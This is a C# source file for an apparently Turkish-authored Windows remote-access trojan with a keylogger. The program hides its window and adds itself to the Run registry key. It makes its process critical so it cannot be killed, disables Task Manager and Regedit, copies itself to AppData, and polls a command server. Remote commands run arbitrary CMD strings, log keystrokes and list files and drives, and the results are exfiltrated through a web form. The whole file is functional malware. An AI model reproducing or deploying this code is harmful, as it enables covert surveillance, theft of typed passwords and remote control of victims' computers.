using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Drawing;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

namespace vir
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }

    public partial class Form1 : Form
    {
        public Form1()
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            this.Load += Form1_Load;
        }
        void Form1_Load(object sender, EventArgs e)
        {
            Invoke();


            using (StreamReader streamReader = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location))
            {
                using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream))
                {
                    byte[] stubBytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
                    string stubSettings = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("***")).Replace("***", "");
                    string[] settings = stubSettings.Split('*');
                    commandAddress = settings[0];
                    sendDataAddress = settings[1];
                    delay = Convert.ToInt32(settings[2]);

                    if (settings[3] == "1")
                        Gizlen = true;
                    if (settings[4] == "1")
                        Yayil = true;
                    if (settings[5] == "1")
                        Korun = true;
                    if (settings[6] == "1")
                        TaskMgr = true;
                    if (settings[7] == "1")
                        Regedit = true;
                    if (settings[8] == "1")
                        Startup = true;
                }
            }

            if (Yayil == true)
                clone();
            if (Startup == true)
                startupAdd();
            if (Korun == true)
                Protect();
            if (TaskMgr == true)
                taskManagerClose();
            if (Regedit == true)
                regeditClose();
            if (Gizlen == true)
                hidden();

            this.WindowState = FormWindowState.Minimized;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.MinimizeBox = false;
            this.MaximizeBox = false;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Size = new System.Drawing.Size(0, 0);
            this.Location = new System.Drawing.Point(-250, -250);
            sendDataWeb.ScriptErrorsSuppressed = true;
            commandWeb.ScriptErrorsSuppressed = true;
            commandAddress += macResize(getMac());
            sendDataAddress += macResize(getMac());
            sendDataWeb.Navigate(sendDataAddress);
            commandWeb.Navigate(commandAddress);
            osDetection();
            firstContact();
            Thread newT = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(delay);
                    commandWeb.Navigate(commandAddress);
                    Thread.Sleep(delay);
                    sendDataWeb.Navigate(sendDataAddress);
                }
            });
            newT.Start();
        }
        #region DllImports
        [DllImport("user32.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int GetAsyncKeyState(long vKey);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        #endregion
        #region Veriables
        List<Thread> attackTH = new List<Thread>();
        Thread keyLogTH;
        List<char> keyLog = new List<char>();
        short[] upperKeyList = new short[] { 32, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 128, 153, 154, 286, 304 }; // A B C D
        private string commandAddress = @"", sendDataAddress = @"", OsVer = "Not Detection";
        private volatile bool s_isProtected = false;
        private ReaderWriterLockSlim s_isProtectedLock = new ReaderWriterLockSlim();
        private bool Gizlen = false, Yayil = false, Korun = false, TaskMgr = false, Regedit = false, Startup = false;
        int delay = 0;
        Dictionary<int, string> attackThIndex = new Dictionary<int, string>();
        #endregion
        #region Component
        public WebBrowser commandWeb = new WebBrowser();
        public WebBrowser sendDataWeb = new WebBrowser();
        #endregion
        #region ComponentMetodInvoke
        private void Invoke()
        {
            commandWeb.DocumentCompleted += commandWeb_DocumentCompleted;
            sendDataWeb.DocumentCompleted += sendDataWeb_DocumentCompleted;
        }
        void sendDataWeb_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            if (sendDataWeb.Url.ToString().IndexOf("verigir.php") != -1)
            {
                if (keyLogTH != null)
                {
                    logSend(new string(keyLog.ToArray()));
                    keyLog.Clear();
                }
                else
                    logSend(Dns.GetHostName());
            }
        }
        void commandWeb_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            string document = commandWeb.Document.Body.OuterHtml;
            string data = document.ToString().Replace("<BR>", "!").Substring(8, document.Length - 22);
            foreach (string item in data.Split('!'))
                commandExecute(item);
        }
        #endregion
        private void startupAdd()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue(Application.ProductName.ToString(), "\"" + Application.ExecutablePath + "\"");
            }
            catch
            { }
        }
        private void hidden()
        {
            try
            {

            }
            catch (Exception)
            { }
        }
        private void Unprotect()
        {
            try
            {
                s_isProtectedLock.EnterWriteLock();

                if (s_isProtected)
                {
                    RtlSetProcessIsCritical(0, 0, 0);
                    s_isProtected = false;
                }
            }
            finally
            {
                s_isProtectedLock.ExitWriteLock();
            }
        }
        private void Protect()
        {
            try
            {
                s_isProtectedLock.EnterWriteLock();

                if (!s_isProtected)
                {
                    System.Diagnostics.Process.EnterDebugMode();
                    RtlSetProcessIsCritical(1, 0, 0);
                    s_isProtected = true;
                }
            }
            finally
            {
                s_isProtectedLock.ExitWriteLock();
            }
        }
        private void taskManagerClose()
        {
            RegistryKey taskm = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies", true);
            taskm.CreateSubKey("System", RegistryKeyPermissionCheck.Default);
            taskm.Close();
            RegistryKey taskm2 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            taskm2.SetValue("DisableTaskMgr", 1);
            taskm2.Close();
        }
        private void regeditClose()
        {
            RegistryKey taskm2 = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            taskm2.SetValue("DisableRegistryTool", 1);
            taskm2.Close();
        }
        private void clone()
        {
            File.Copy(Application.ExecutablePath + "/" + Application.ProductName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Application.ProductName.ToString());
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Application.ProductName.ToString() + ".exe");
        }
        private void firstContact()
        {
            sendDataWeb.Navigate(sendDataAddress);
        }
        private string macResize(string originMac)
        {
            return originMac.Substring(0, 2) +
             ":" + originMac.Substring(2, 2) +
             ":" + originMac.Substring(4, 2) +
             ":" + originMac.Substring(6, 2) +
             ":" + originMac.Substring(8, 2) +
             ":" + originMac.Substring(10, 2);
        }
        private string getMac()
        {
            return NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
        }
        private void commandExecute(string data)
        {
            try
            {
                string com = data.Split('?')[0];
                string value = data.Split('?')[1];
                if (com == "attack" && value != "0")
                {
                    foreach (var item in attackThIndex)
                        if (item.Value == value) return;
                    Thread th = new Thread(() =>
                    {
                        string strCmdText;
                        strCmdText = "/c " + value + " -t";
                        System.Diagnostics.Process.Start("CMD.exe", strCmdText);
                    });
                    attackThIndex.Add(attackThIndex.Count + 1, value);
                    th.Start();
                    attackTH.Add(th);
                }
                else if (com == "attack" && value == "0")
                {
                    if (attackTH != null)
                    {
                        foreach (var item in attackTH)
                            item.Abort();
                        return;
                    }
                }
                else if (com == "key" && value == "1")
                {
                    if (keyLogTH == null)
                    {
                        Thread th = new Thread(() => keylogStart());
                        th.Start();
                        keyLogTH = th;
                    }
                }
                else if (com == "key" && value == "0")
                {
                    if (keyLogTH != null)
                    {
                        keyLogTH.Abort();
                        Application.Restart();
                        Application.Exit();
                    }
                }
                else if (com == "hata" && value != "")
                {
                    MessageBox.Show(value, "Hata !", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else if (com == "getDir" && value != "")
                {
                    string dir = "";
                    foreach (string item in Directory.GetDirectories(value))
                        dir += item + "<br/>";
                    foreach (string item in Directory.GetFiles(value))
                        dir += item + "<br/>";
                    logSend(dir);
                }
                else if (com == "getReg" && value != "")
                {
                    string result = "";
                    logSend(result);
                }
                else if (com == "getDisk" && value == "")
                {
                    string disk = "";
                    foreach (DriveInfo drive in DriveInfo.GetDrives())
                    {
                        disk += drive.RootDirectory + "<br/>";
                    }
                    logSend(disk);
                }
            }
            catch (Exception) { return; }
        }
        private void keylogStart()
        {
            while (true)
            {
                foreach (short item in upperKeyList)
                {
                    if (GetAsyncKeyState(item) != 0)
                    {
                        if (keyLog.Count != 0)
                            if (keyLog[keyLog.Count - 1] != item)
                                keyLog.Add((char)item);
                            else
                                break;
                        else
                            keyLog.Add((char)item);
                        break;
                    }
                }
            }
        }
        private void osDetection()
        {
            OperatingSystem OS = Environment.OSVersion;
            string sistem = OS.ToString();
            if (sistem.IndexOf("6.2") != -1)
                OsVer = "Windows 8 yada üstü";
            else if (sistem.IndexOf("6.1") != -1)
                OsVer = "Windows 7";
            else if (sistem.IndexOf("6.0") != -1)
                OsVer = "Windows Vista";
            else if (sistem.IndexOf("5.2") != -1)
                OsVer = "Windows XP x64";
            else if (sistem.IndexOf("5.1") != -1)
                OsVer = "Windows XP";
        }
        private void logSend(string log)
        {
            try
            {
                HtmlElement text = sendDataWeb.Document.GetElementById("txt");
                HtmlElement butn = sendDataWeb.Document.GetElementById("btn");
                HtmlElement text2 = sendDataWeb.Document.GetElementById("txt2");
                text.SetAttribute("value", log);
                text2.SetAttribute("value", OsVer);
                butn.InvokeMember("click");
            }
            catch (Exception) { }
        }
    }
}
